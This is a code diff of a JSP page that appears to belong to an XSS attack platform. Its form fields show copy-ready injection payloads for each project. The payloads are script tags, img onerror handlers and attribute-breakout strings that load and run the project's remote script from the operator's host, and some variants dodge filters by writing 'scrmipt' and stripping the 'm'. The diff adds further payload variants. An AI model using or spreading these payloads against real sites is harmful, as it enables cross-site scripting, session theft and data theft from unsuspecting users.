@@ -96,17 +96,36 @@
 										<c:if test="${(!empty project)&&(!empty project.uri) }">
 											<div class="am-form-group">
 												<span><label><small>引用代码：</small></label> <input
-													type="text" class="cshort" id="doc-vld-name-2"
-													value="&lt;script src=${project.uri }&gt;&lt;/script&gt;" />
-												</span> <span><label><small>引用短路径代码：</small></label> <input
-													type="text" class="cshort" id="doc-vld-name-2"
+													type="text" class="cshort"	
+												id="doc-vld-name-2"
+													value="&lt;script src=${project.uri }&gt;&lt;/script&gt;" /> 
+												</span> 
+												<span><label><small>引用短路径代码：</small></label>
+													<input type="text" class="cshort"
+												id="doc-vld-name-2"
 													value="&lt;script src=${project.sortUri }&gt;&lt;/script&gt;" />
-												</span> <span> <label><small>img插入：</small></label> <input
-													type="text" class="cshort" id="doc-vld-name-2"
-													value="&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='${project.sortUri }';&gt;" />
-												</span> <span><label><small>img插入(无Script)：</small></label>
-													<input type="text" class="cshort" id="doc-vld-name-2"
-													value="&lt;img img src=x onerror=s=createElement('scrmipt'.replace('m',''));body.appendChild(s);s.src='${project.sortUri }';&gt;" />
+												</span> 
+												<span>
+													<label><small>Img插入：</small></label>
+													<input type="text" class="cshort"
+												id="doc-vld-name-2"
+													value="&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='${project.sortUri }';&gt;"	/>
+												</span>
+												<span>
+													<label><small>Img-Url插入：</small></label>
+													<input type="text" class="cshort"
+												id="doc-vld-name-2"
+													value="x&quot; onerror=s=createElement('script');body.appendChild(s);s.src='${project.sortUri }'&quot;"	/>
+												</span>
+												<span><label><small>img插入(无Script)：</small></label>
+													<input type="text" class="cshort"
+												id="doc-vld-name-2"
+													value="&lt;img src=x onerror=s=createElement('scrmipt'.replace('m',''));body.appendChild(s);s.src='${project.sortUri }';&gt;"/> 
+												</span>
+												<span><label><small>Img-Url插入(无Script)：</small></label>
+													<input type="text" class="cshort"
+												id="doc-vld-name-2"
+													value="x&quot; onerror=s=createElement('scrmipt'.replace('m',''));body.appendChild(s);s.src='${project.sortUri }'&quot;"/> 
 												</span>
 											</div>
 										</c:if>
